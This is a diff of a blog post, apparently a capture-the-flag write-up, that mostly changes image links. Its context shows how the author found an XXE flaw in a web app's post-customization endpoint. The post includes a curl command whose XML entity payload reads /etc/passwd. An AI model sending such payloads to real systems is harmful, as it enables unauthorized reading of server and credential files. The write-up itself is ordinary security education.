@@ -15,30 +15,37 @@ but none of them actually made it to such a big event.
 
 accessing the challenge url we get redirected to `/login`
 
-![login](/images/SpecialOrder/login.png)
+![login](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/Login.png)
 
 we see there's an option to register so we register a user, then login
-![blog](/images/SpecialOrder/Blog-1.png)
+
+![blog](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/Blog-1.png)
 
 creating a post
-![post-1](/images/SpecialOrder/post-1.png)
-![post-2](/images/SpecialOrder/post-2.png)
+
+![post-1](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/post-1.png)
+![post-2](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/post-2.png)
 
 also we have the ability to customize how our posts look
-*interesting*
-![customize-1](/images/SpecialOrder/customize-1.png)
-![customize-2](/images/SpecialOrder/customize-2.png)
+<br />*interesting*
+
+![customize-1](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-1.png)
+
+![customize-2](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-2.png)
 
 ~~looks ugly ngl~~
 
 from here we can observe that our customization input is getting to the css file
-![css](/images/SpecialOrder/css.png)
+
+![css](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/css.png)
 
 looking back at the request for customizing the post's look
-![request](/images/SpecialOrder/customize-request.png)
+
+![request](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-request.png)
 
 changing the content-type header we see that the app accepts xml
-![curl](/images/SpecialOrder/customize-request.png)
+
+![curl](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/curl.png)
 
 so let's send an xxe payload
 ```bash
@@ -48,7 +55,7 @@ curl 'http://ip/customize' \
       --data-binary '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><color>&xxe;</color><size>20px</size></root>'
 ```
 
-![passwd](/images/SpecialOrder/passwd.png)
+![passwd](https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/passwd.png)
 
 now just read /flag.txt and done :)
 
